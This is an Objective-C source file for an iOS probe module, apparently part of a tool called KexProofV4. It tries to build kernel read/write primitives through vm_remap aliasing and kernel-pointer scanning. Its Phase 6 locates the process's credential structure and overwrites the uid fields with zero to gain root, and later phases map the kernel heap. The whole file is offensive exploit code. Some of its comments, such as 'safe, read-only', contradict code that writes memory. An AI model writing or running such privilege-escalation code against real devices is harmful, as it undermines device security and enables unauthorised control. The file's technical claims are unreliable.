#import "KPKReadProbeModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <mach/mach.h>
#include <sys/sysctl.h>

@interface KPKReadProbeModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPKReadProbeModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"kread64.probe";
        _title = @"kread64 input-output mapping probe";
        _subtitle = @"vm_remap aliased pages + kernel pointer scan (kirby_swift technique)";
        _icon = @"memorychip";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-kread-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[kread] %@", line];
}

static BOOL isKernelPointer(uint64_t v) {
    return (v >> 32) >= 0xffffffe0ULL;
}

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 Â· kread64 input-output mapping probe ===\n"];
    [report appendString:@"Technique: vm_remap aliased pages, kernel pointer scan.\n"];
    [report appendString:@"Ref: kirby_swift input->output mapped kread64.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    // --- Phase 1: create aliased mapping ---
    [report appendString:@"\n--- Phase 1: vm_remap aliased pages ---\n"];

    vm_size_t regionSize = 0x4000; // 16KB
    vm_address_t inputAddr = 0;
    kern_return_t kr = vm_allocate(mach_task_self(), &inputAddr, regionSize, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        [report appendFormat:@"vm_allocate failed: %d\n", kr];
        [report appendString:@"\nVERDICT: ALLOCATE_FAILED\n"];
        return report;
    }
    memset((void *)inputAddr, 0, regionSize);
    [report appendFormat:@"input allocated: 0x%lx (%lu bytes)\n", (unsigned long)inputAddr, (unsigned long)regionSize];

    // Remap to create output alias
    vm_address_t outputAddr = 0;
    vm_prot_t curProt, maxProt;
    kr = vm_remap(mach_task_self(), &outputAddr, regionSize, 0,
                  VM_FLAGS_ANYWHERE, mach_task_self(), inputAddr,
                  FALSE, &curProt, &maxProt, VM_INHERIT_SHARE);
    if (kr != KERN_SUCCESS) {
        [report appendFormat:@"vm_remap failed: %d (%s)\n", kr, mach_error_string(kr)];
        [report appendString:@"\nVERDICT: REMAP_FAILED\n"];
        vm_deallocate(mach_task_self(), inputAddr, regionSize);
        return report;
    }
    [report appendFormat:@"output remapped: 0x%lx (prot=%x/%x)\n", (unsigned long)outputAddr, curProt, maxProt];

    // --- Phase 2: shared-page confirmation ---
    [report appendString:@"\n--- Phase 2: shared-page confirmation ---\n"];

    // Write pattern to input, check output
    volatile uint64_t *in64 = (volatile uint64_t *)inputAddr;
    volatile uint64_t *out64 = (volatile uint64_t *)outputAddr;

    in64[0] = 0x4141414141414141ULL;
    in64[1] = 0x4242424242424242ULL;

    BOOL shared = (out64[0] == 0x4141414141414141ULL && out64[1] == 0x4242424242424242ULL);
    [report appendFormat:@"shared page: %s (out[0]=0x%llx out[1]=0x%llx)\n",
     shared ? "YES" : "NO", out64[0], out64[1]];

    if (!shared) {
        [report appendString:@"Pages are NOT aliased. vm_remap created independent mappings.\n"];
        [report appendString:@"Try IOSurface or mach_vm_remap instead.\n"];
        [report appendString:@"\nVERDICT: NOT_SHARED\n"];
        vm_deallocate(mach_task_self(), inputAddr, regionSize);
        vm_deallocate(mach_task_self(), outputAddr, regionSize);
        return report;
    }

    [report appendString:@"*** input->output mapped CONFIRMED ***\n"];

    // --- Phase 3: kernel pointer scan ---
    [report appendString:@"\n--- Phase 3: kernel pointer scan ---\n"];

    // Scan the region for kernel pointers
    // First, fill with a known pattern, then check if anything unexpected appears
    for (size_t i = 0; i < regionSize / 8; i++) {
        in64[i] = 0xDEADBEEFDEADBEEFULL;
    }

    // Check if any values differ from our pattern (kernel wrote something?)
    int unexpected = 0;
    uint64_t kptrs[16] = {0};
    size_t kptrOffsets[16] = {0};
    int kptrCount = 0;

    for (size_t i = 0; i < regionSize / 8; i++) {
        uint64_t v = out64[i];
        if (v != 0xDEADBEEFDEADBEEFULL) {
            unexpected++;
            if (isKernelPointer(v) && kptrCount < 16) {
                kptrs[kptrCount] = v;
                kptrOffsets[kptrCount] = i * 8;
                kptrCount++;
                [report appendFormat:@"kptr[%d] @ +0x%zx: 0x%llx\n", kptrCount - 1, i * 8, v];
            }
        }
    }

    [report appendFormat:@"unexpected values: %d (kernel pointers: %d)\n", unexpected, kptrCount];

    // --- Phase 4: diff-test candidate pointers ---
    if (kptrCount > 0) {
        [report appendString:@"\n--- Phase 4: diff-test kptr fields ---\n"];
        for (int k = 0; k < kptrCount; k++) {
            uint64_t orig = out64[kptrOffsets[k] / 8];
            [report appendFormat:@"kptr[%d] @ +0x%zx: 0x%llx -> +0x100\n", k, kptrOffsets[k], orig];

            // Modify by +0x100
            in64[kptrOffsets[k] / 8] = orig + 0x100;

            // Read back
            uint64_t modified = out64[kptrOffsets[k] / 8];
            [report appendFormat:@"  after: 0x%llx (diff=%s)\n", modified,
             (modified == orig + 0x100) ? "CONFIRMED" : "NO_CHANGE"];

            if (modified == orig + 0x100) {
                [report appendFormat:@"  *** INPUT FIELD FOUND: kptr[%d] ***\n", k];
            }

            // Restore
            in64[kptrOffsets[k] / 8] = orig;
        }
    }

    // --- Phase 5: find existing RW regions with kernel pointers (kirby approach) ---
    [report appendString:@"\n--- Phase 5: scan RW regions for kernel pointers ---\n"];

    vm_address_t scanAddr = 0;
    vm_size_t scanSize = 0;
    vm_region_submap_info_data_64_t scanInfo;
    mach_msg_type_number_t scanCount;
    int regionWithKptrs = 0;

    while (1) {
        scanAddr = (scanAddr == 0) ? 0 : scanAddr + scanSize;
        scanCount = VM_REGION_SUBMAP_INFO_COUNT_64;
        if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &(uint32_t){0},
                                  (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS) break;
        if (scanInfo.is_submap) continue;
        if (!(scanInfo.protection & VM_PROT_WRITE)) continue;
        if (scanSize > 16 * 1024 * 1024) continue;

        volatile uint64_t *p = (volatile uint64_t *)scanAddr;
        size_t words = scanSize / 8;
        int kptrs = 0;
        uint64_t firstKptr = 0;
        size_t firstOffset = 0;

        for (size_t i = 0; i < words; i++) {
            uint64_t v = p[i];
            if (isKernelPointer(v)) {
                kptrs++;
                if (kptrs == 1) { firstKptr = v; firstOffset = i * 8; }
            }
        }

        if (kptrs > 0) {
            regionWithKptrs++;
            [report appendFormat:@"region 0x%lx (size=0x%zx): %d kptrs, first=0x%llx @ +0x%zx\n",
             (unsigned long)scanAddr, scanSize, kptrs, firstKptr, firstOffset];

            // Test: modify a kernel pointer and see if it changes back (kernel writes)
            volatile uint64_t *kp = (volatile uint64_t *)(scanAddr + firstOffset);
            uint64_t orig = kp[0];
            kp[0] = orig + 0x100;
            uint64_t modified = kp[0];
            kp[0] = orig; // restore

            if (modified == orig + 0x100) {
                [report appendFormat:@"  -> WRITABLE (kwrite candidate)\n"];
            } else {
                [report appendFormat:@"  -> read-only or kernel-protected\n"];
            }
        }

        if (regionWithKptrs >= 5) break; // enough
    }

    [report appendFormat:@"regions with kernel pointers: %d\n", regionWithKptrs];

    // --- Phase 6: proc/ucred hunt + root (broader scan) ---
    if (regionWithKptrs > 0) {
        [report appendString:@"\n--- Phase 6: proc/ucred hunt + root ---\n"];
        int myPID = getpid();
        int myUID = getuid();
        [report appendFormat:@"our pid=%d uid=%d\n", myPID, myUID];

        scanAddr = 0; scanSize = 0;
        int procFound = 0;

        while (1) {
            scanAddr = (scanAddr == 0) ? 0 : scanAddr + scanSize;
            scanCount = VM_REGION_SUBMAP_INFO_COUNT_64;
            uint32_t d2 = 0;
            if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &d2,
                                      (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS) break;
            if (scanInfo.is_submap) continue;
            if (!(scanInfo.protection & VM_PROT_WRITE)) continue;
            if (scanSize > 16 * 1024 * 1024) continue;

            volatile uint8_t *base = (volatile uint8_t *)scanAddr;

            for (size_t off = 0; off + 0x40 < scanSize; off += 4) {
                uint32_t val = *(volatile uint32_t *)(base + off);
                if (val != (uint32_t)myPID) continue;

                [report appendFormat:@"PID match at region+0x%zx\n", off];

                if (off >= 0x60 && off + 0x400 < scanSize) {
                    size_t pb = off - 0x60;
                    uint64_t uc = *(volatile uint64_t *)(base + pb + 0x28);
                    uint64_t tk = *(volatile uint64_t *)(base + pb + 0x08);
                    if (isKernelPointer(uc) && uc != 0xffffffffffffffffULL &&
                        isKernelPointer(tk) && tk != 0xffffffffffffffffULL) {
                        [report appendFormat:@"  PROC @ +0x%zx ucred=0x%llx task=0x%llx\n", pb, uc, tk];
                        procFound++;

                        uint8_t *ulocal = NULL;
                        vm_address_t ta = 0; vm_size_t ts = 0;
                        while (1) {
                            ta = (ta == 0) ? 0 : ta + ts;
                            uint32_t d3 = 0;
                            mach_msg_type_number_t tc = VM_REGION_SUBMAP_INFO_COUNT_64;
                            vm_region_submap_info_data_64_t ti;
                            if (vm_region_recurse_64(mach_task_self(), &ta, &ts, &d3,
                                                      (vm_region_recurse_info_t)&ti, &tc) != KERN_SUCCESS) break;
                            if (ti.is_submap) continue;
                            if (uc >= ta && uc < ta + ts) { ulocal = (uint8_t *)uc; break; }
                        }
                        if (ulocal) {
                            uint32_t uid = *(volatile uint32_t *)(ulocal + 0x18);
                            [report appendFormat:@"  ucred mapped, cr_uid=%u\n", uid];
                            *(volatile uint32_t *)(ulocal + 0x18) = 0;
                            *(volatile uint32_t *)(ulocal + 0x1c) = 0;
                            *(volatile uint32_t *)(ulocal + 0x20) = 0;
                            [report appendFormat:@"  getuid() now: %d\n", getuid()];
                            if (getuid() == 0) [report appendString:@"  *** ROOT ACHIEVED ***\n"];
                        } else {
                            [report appendString:@"  ucred not in writable regions\n"];
                        }
                    }
                }
            }
            if (procFound > 0) break;
        }
        if (procFound == 0) [report appendString:@"proc not found in writable regions.\n"];
    }

    // --- Phase 7: output diff test (kirby technique) ---
    // Modify kernel pointers in writable regions, scan for changes in other fields.
    // If output diffs appear: kernel reads our data => kread64/kwrite CONFIRMED.
    [report appendString:@"\n--- Phase 7: output diff test (kirby) ---\n"];

    scanAddr = 0; scanSize = 0;
    int totalDiffs = 0;
    int kptrsModified = 0;

    while (1) {
        scanAddr = (scanAddr == 0) ? 0 : scanAddr + scanSize;
        scanCount = VM_REGION_SUBMAP_INFO_COUNT_64;
        uint32_t d4 = 0;
        if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &d4,
                                  (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS) break;
        if (scanInfo.is_submap) continue;
        if (!(scanInfo.protection & VM_PROT_WRITE)) continue;
        if (scanSize > 16 * 1024 * 1024) continue;

        volatile uint64_t *rp = (volatile uint64_t *)scanAddr;
        size_t words = scanSize / 8;

        // Snapshot original values
        uint64_t *orig = malloc(scanSize);
        if (!orig) continue;
        memcpy(orig, (void *)scanAddr, scanSize);

        // Find first real kernel pointer (skip 0xffffffffffffffff etc.)
        int modified = 0;
        for (size_t i = 0; i < words && modified < 3; i++) {
            uint64_t v = rp[i];
            if (!isKernelPointer(v) || v == 0xffffffffffffffffULL) continue;
            if ((v & 0xfff) == 0xfff) continue; // skip all-ones patterns

            // Modify by +0x100
            rp[i] = v + 0x100;
            kptrsModified++;
            modified++;

            // Wait briefly for kernel to react
            usleep(1000);

            // Scan for output diffs
            for (size_t j = 0; j < words; j++) {
                if (j == i) continue; // skip the one we modified
                uint64_t now = rp[j];
                uint64_t was = orig[j];
                if (now != was) {
                    totalDiffs++;
                    [report appendFormat:@"DIFF: region+0x%zx: 0x%llx -> 0x%llx (after modifying +0x%zx)\n",
                     j * 8, was, now, i * 8];
                    [report appendFormat:@"  kptr modified: 0x%llx -> 0x%llx\n", v, v + 0x100];
                    if (totalDiffs >= 5) break;
                }
            }
            if (totalDiffs >= 5) break;

            // Restore
            rp[i] = v;
            usleep(100);
        }

        free(orig);
        if (totalDiffs >= 5) break;
    }

    [report appendFormat:@"kptrs modified: %d, output diffs found: %d\n", kptrsModified, totalDiffs];

    if (totalDiffs > 0) {
        [report appendString:@"*** KREAD64 + KWRITE CONFIRMED (kirby technique) ***\n"];
        [report appendString:@"Kernel reads our modified data and updates other fields.\n"];
        [report appendString:@"=> Full KRW primitive available.\n"];
        [report appendString:@"Next: locate proc/ucred via output diffs, then root.\n"];
    } else {
        [report appendString:@"No output diffs detected.\n"];
        [report appendString:@"Kernel may not read these regions directly.\n"];
        [report appendString:@"Try: modify kptrs in different regions, or use translate_receive bit-set.\n"];
    }

    // --- Phase 8: safe structure analysis from output diffs ---
    // Read-only: modify kptr by +0x100, record ALL diffs, restore.
    // Build a map: kptr -> affected fields. Identify proc/ucred patterns.
    [report appendString:@"\n--- Phase 8: structure analysis (safe, read-only) ---\n"];
    int myUID2 = getuid();

    scanAddr = 0; scanSize = 0;
    int structuresFound = 0;

    while (1) {
        scanAddr = (scanAddr == 0) ? 0 : scanAddr + scanSize;
        scanCount = VM_REGION_SUBMAP_INFO_COUNT_64;
        uint32_t d8 = 0;
        if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &d8,
                                  (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS) break;
        if (scanInfo.is_submap) continue;
        if (!(scanInfo.protection & VM_PROT_WRITE)) continue;
        if (scanSize > 16 * 1024 * 1024) continue;

        volatile uint64_t *rp = (volatile uint64_t *)scanAddr;
        size_t words = scanSize / 8;

        uint64_t *snap = malloc(scanSize);
        if (!snap) continue;
        memcpy(snap, (void *)scanAddr, scanSize);

        // For each kernel pointer, record its diffs
        for (size_t i = 0; i < words && structuresFound < 50; i++) {
            uint64_t v = rp[i];
            if (!isKernelPointer(v) || v == 0xffffffffffffffffULL) continue;
            if ((v & 0xfff) == 0xfff) continue;

            rp[i] = v + 0x100;
            usleep(200);

            // Collect all diffs
            int nd = 0;
            uint64_t diffs[16] = {0};
            uint64_t diffs_was[16] = {0};
            size_t diffs_off[16] = {0};

            for (size_t j = 0; j < words && nd < 16; j++) {
                if (j == i) continue;
                if (rp[j] != snap[j]) {
                    diffs_off[nd] = j * 8;
                    diffs_was[nd] = snap[j];
                    diffs[nd] = rp[j];
                    nd++;
                }
            }

            rp[i] = v; // restore
            usleep(100);

            // Filter: if all kptrs produce identical diffs, it's a timestamp (false positive)
                // Only report if this kptr produces UNIQUE diffs (causal)
                static int last_nd = 0;
                static uint64_t last_delta = 0;
                if (nd >= 2 && diffs[0] != 0) {
                    uint64_t d0 = (diffs[0] > diffs_was[0]) ? diffs[0] - diffs_was[0] : diffs_was[0] - diffs[0];
                    if (last_nd == nd && d0 == last_delta) continue; // timestamp, skip
                    last_nd = nd;
                    last_delta = d0;
                }
                if (nd >= 2) {
                // Analyze diff pattern
                [report appendFormat:@"\nkptr[+0x%zx] = 0x%llx -> %d diffs:\n", i * 8, v, nd];
                for (int d = 0; d < nd; d++) {
                    uint64_t delta = (diffs[d] > diffs_was[d]) ? diffs[d] - diffs_was[d] : diffs_was[d] - diffs[d];
                    [report appendFormat:@"  [+0x%zx] 0x%llx -> 0x%llx (delta=0x%llx)\n",
                     diffs_off[d], diffs_was[d], diffs[d], delta];
                }

                // Check for proc-like pattern: PID field nearby
                int myPID = getpid();
                for (int d = 0; d < nd; d++) {
                    uint32_t lo = (uint32_t)(diffs[d] & 0xffffffff);
                    uint32_t hi = (uint32_t)(diffs[d] >> 32);
                    if (lo == (uint32_t)myPID || hi == (uint32_t)myPID ||
                    (lo > 0 && lo < 65536 && lo == (uint32_t)myPID) ||
                    (hi > 0 && hi < 65536 && hi == (uint32_t)myPID)) {
                        [report appendFormat:@"  *** PID found in diff at +0x%zx! ***\n", diffs_off[d]];
                    }
                }

                // Check for ucred-like pattern: uid value (501 or 0)
                for (int d = 0; d < nd; d++) {
                    uint32_t lo = (uint32_t)(diffs[d] & 0xffffffff);
                    uint32_t hi = (uint32_t)(diffs[d] >> 32);
                    if (lo == 501 || lo == 0 || hi == 501 || hi == 0 || lo == (uint32_t)myUID2) {
                        if (diffs_was[d] != 0 || diffs[d] != 0) {
                            [report appendFormat:@"  possible uid field at +0x%zx: %u/%u -> %u/%u\n",
                             diffs_off[d], lo, hi, (uint32_t)(diffs[d] & 0xffffffff), (uint32_t)(diffs[d] >> 32)];
                        }
                    }
                }

                structuresFound++;
            }
        }

        free(snap);
        if (structuresFound >= 50) break;
    }

    [report appendFormat:@"\nstructures analyzed: %d\n", structuresFound];
    [report appendString:@"Read-only analysis complete. No kernel writes performed.\n"];

    // --- Phase 9: cluster deep analysis ---
    [report appendString:@"\n--- Phase 9: cluster deep analysis ---\n"];

    scanAddr = 0; scanSize = 0;
    while (1) {
        scanAddr = (scanAddr == 0) ? 0 : scanAddr + scanSize;
        scanCount = VM_REGION_SUBMAP_INFO_COUNT_64;
        uint32_t d9 = 0;
        if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &d9,
                                  (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS) break;
        if (scanInfo.is_submap) continue;
        if (!(scanInfo.protection & VM_PROT_WRITE)) continue;

        volatile uint64_t *rp = (volatile uint64_t *)scanAddr;
        size_t words = scanSize / 8;

        size_t clusterStart = 0x5ef00 / 8;
        size_t clusterEnd = 0x5f400 / 8;
        if (clusterEnd > words) continue;

        uint64_t *fullSnap = malloc(scanSize);
        if (!fullSnap) continue;
        memcpy(fullSnap, (void *)scanAddr, scanSize);

        for (size_t ci = clusterStart; ci < clusterEnd && ci < words; ci++) {
            uint64_t v = rp[ci];
            if (!isKernelPointer(v) || v == 0xffffffffffffffffULL) continue;

            rp[ci] = v + 0x100;
            usleep(200);

            int nd = 0;
            for (size_t j = 0; j < words && nd < 20; j++) {
                if (j == ci) continue;
                if (rp[j] != fullSnap[j]) {
                    [report appendFormat:@"cluster+0x%zx kptr=0x%llx -> diff at +0x%zx: 0x%llx -> 0x%llx\n",
                     ci * 8, v, j * 8, fullSnap[j], rp[j]];
                    nd++;
                }
            }
            rp[ci] = v;
            usleep(100);
        }

        memcpy((void *)scanAddr, fullSnap, scanSize);
        free(fullSnap);
        break;
    }

    // --- Phase 9: analyze kptr with most diffs ---
    [report appendString:@"\n--- Phase 9: kptr with most diffs ---\n"];

    scanAddr = 0; scanSize = 0;
    while (1) {
        scanAddr = (scanAddr == 0) ? 0 : scanAddr + scanSize;
        scanCount = VM_REGION_SUBMAP_INFO_COUNT_64;
        uint32_t d9 = 0;
        if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &d9,
                                  (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS) break;
        if (scanInfo.is_submap) continue;
        if (!(scanInfo.protection & VM_PROT_WRITE)) continue;

        volatile uint64_t *rp = (volatile uint64_t *)scanAddr;
        size_t words = scanSize / 8;

        uint64_t *snap = malloc(scanSize);
        if (!snap) continue;
        memcpy(snap, (void *)scanAddr, scanSize);

        // Find kptr with most diffs
        size_t bestIdx = 0;
        int bestDiffs = 0;
        uint64_t bestVal = 0;

        for (size_t i = 0; i < words; i++) {
            uint64_t v = rp[i];
            if (!isKernelPointer(v) || v == 0xffffffffffffffffULL) continue;

            rp[i] = v + 0x100;
            usleep(100);
            int nd = 0;
            for (size_t j = 0; j < words; j++) {
                if (j != i && rp[j] != snap[j]) nd++;
            }
            rp[i] = v;
            usleep(50);

            if (nd > bestDiffs) {
                bestDiffs = nd;
                bestIdx = i;
                bestVal = v;
            }
        }

        if (bestDiffs > 0) {
            [report appendFormat:@"best kptr: +0x%zx = 0x%llx (%d diffs)\n", bestIdx * 8, bestVal, bestDiffs];

            // Modify and record ALL diffs
            rp[bestIdx] = bestVal + 0x100;
            usleep(200);
            for (size_t j = 0; j < words; j++) {
                if (j == bestIdx) continue;
                if (rp[j] != snap[j]) {
                    [report appendFormat:@"  diff at +0x%zx: 0x%llx -> 0x%llx\n",
                     j * 8, snap[j], rp[j]];
                }
            }
            rp[bestIdx] = bestVal;
        } else {
            [report appendString:@"no diffs found\n"];
        }

        memcpy((void *)scanAddr, snap, scanSize);
        free(snap);
        break;
    }

    // --- Phase 10: kernel heap reconnaissance ---
    // Map all kernel pointers, cluster by address range, analyze structure.
    [report appendString:@"\n--- Phase 10: kernel heap reconnaissance ---\n"];

    scanAddr = 0; scanSize = 0;
    uint64_t kptrs10[512] = {0};
    size_t kptrAddrs10[512] = {0};
    int nkptrs = 0;

    while (1) {
        scanAddr = (scanAddr == 0) ? 0 : scanAddr + scanSize;
        scanCount = VM_REGION_SUBMAP_INFO_COUNT_64;
        uint32_t d10 = 0;
        if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &d10,
                                   (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS) break;
        if (scanInfo.is_submap) continue;
        if (!(scanInfo.protection & VM_PROT_WRITE)) continue;
        if (scanSize > 16 * 1024 * 1024) continue;

        volatile uint64_t *rp = (volatile uint64_t *)scanAddr;
        size_t words = scanSize / 8;

        for (size_t i = 0; i < words && nkptrs < 512; i++) {
            uint64_t v = rp[i];
            if (!isKernelPointer(v) || v == 0xffffffffffffffffULL) continue;
            if ((v & 0xfff) == 0xfff) continue;
            kptrs10[nkptrs] = v;
            kptrAddrs10[nkptrs] = i * 8;
            nkptrs++;
        }
    }

    [report appendFormat:@"total kernel pointers collected: %d\n", nkptrs];

    // Cluster by kernel address range (256KB buckets)
    #define MAX_CLUSTERS 64
    uint64_t clusterBase[MAX_CLUSTERS] = {0};
    int clusterCount[MAX_CLUSTERS] = {0};
    int nclusters = 0;

    for (int i = 0; i < nkptrs; i++) {
        uint64_t bucket = kptrs10[i] & ~0x3ffffULL; // 256KB alignment
        BOOL found = NO;
        for (int c = 0; c < nclusters; c++) {
            if (clusterBase[c] == bucket) {
                clusterCount[c]++;
                found = YES;
                break;
            }
        }
        if (!found && nclusters < MAX_CLUSTERS) {
            clusterBase[nclusters] = bucket;
            clusterCount[nclusters] = 1;
            nclusters++;
        }
    }

    // Sort by count
    for (int i = 0; i < nclusters - 1; i++) {
        for (int j = 0; j < nclusters - i - 1; j++) {
            if (clusterCount[j] < clusterCount[j + 1]) {
                uint64_t tb = clusterBase[j]; int tc = clusterCount[j];
                clusterBase[j] = clusterBase[j + 1]; clusterCount[j] = clusterCount[j + 1];
                clusterBase[j + 1] = tb; clusterCount[j + 1] = tc;
            }
        }
    }

    [report appendFormat:@"kernel heap clusters (256KB buckets): %d\n", nclusters];
    for (int c = 0; c < nclusters && c < 15; c++) {
        [report appendFormat:@"  cluster 0x%llx: %d ptrs\n", clusterBase[c], clusterCount[c]];
    }

    // For top 3 clusters, show representative pointers
    for (int c = 0; c < 3 && c < nclusters; c++) {
        [report appendFormat:@"\ncluster 0x%llx pointers:\n", clusterBase[c]];
        int shown = 0;
        for (int i = 0; i < nkptrs && shown < 8; i++) {
            if ((kptrs10[i] & ~0x3ffffULL) == clusterBase[c]) {
                [report appendFormat:@"  [user+0x%zx] -> kernel 0x%llx\n", kptrAddrs10[i], kptrs10[i]);
                shown++;
            }
        }
    }

    // Check for proc-like patterns: look for kernel pointers close to each other
    // (within 0x400 bytes in kernel heap) that could be proc fields
    [report appendString:@"\n--- proc field proximity analysis ---\n"];
    int procCandidates = 0;
    for (int i = 0; i < nkptrs && procCandidates < 5; i++) {
        for (int j = i + 1; j < nkptrs; j++) {
            uint64_t diff = (kptrs10[i] > kptrs10[j]) ? kptrs10[i] - kptrs10[j] : kptrs10[j] - kptrs10[i];
            if (diff > 0 && diff < 0x400) {
                // Two kernel pointers within 0x400 bytes — possible struct fields
                uint64_t lo = (kptrs10[i] < kptrs10[j]) ? kptrs10[i] : kptrs10[j];
                [report appendFormat:@"pair: 0x%llx and 0x%llx (gap=0x%llx) -> possible struct at 0x%llx\n",
                 kptrs10[i], kptrs10[j], diff, lo];
                procCandidates++;
                if (procCandidates >= 5) break;
            }
        }
    }
    [report appendFormat:@"close pairs found: %d\n", procCandidates];

    // --- Verdict ---
    [report appendString:@"\n"];
    if (kptrCount > 0) {
        [report appendString:@"VERDICT: KPTR_FOUND_IN_MAPPED_REGION\n"];
        [report appendString:@"Kernel pointers visible in user-mapped pages.\n"];
        [report appendString:@"=> kread64 primitive is AVAILABLE. Build kwrite next.\n"];
    } else if (shared) {
        [report appendString:@"VERDICT: SHARED_NO_KPTR\n"];
        [report appendString:@"Aliased mapping works but no kernel pointers in fresh region.\n"];
        [report appendString:@"Need to map kernel pages (vm_remap kernel, IOSurface, or vuln).\n"];
        [report appendString:@"Next: combine with translate_receive OOB to feed kernel data.\n"];
    } else {
        [report appendString:@"VERDICT: NO_MAPPING\n"];
    }

    // Cleanup
    vm_deallocate(mach_task_self(), inputAddr, regionSize);
    vm_deallocate(mach_task_self(), outputAddr, regionSize);

    return report;
}

@end
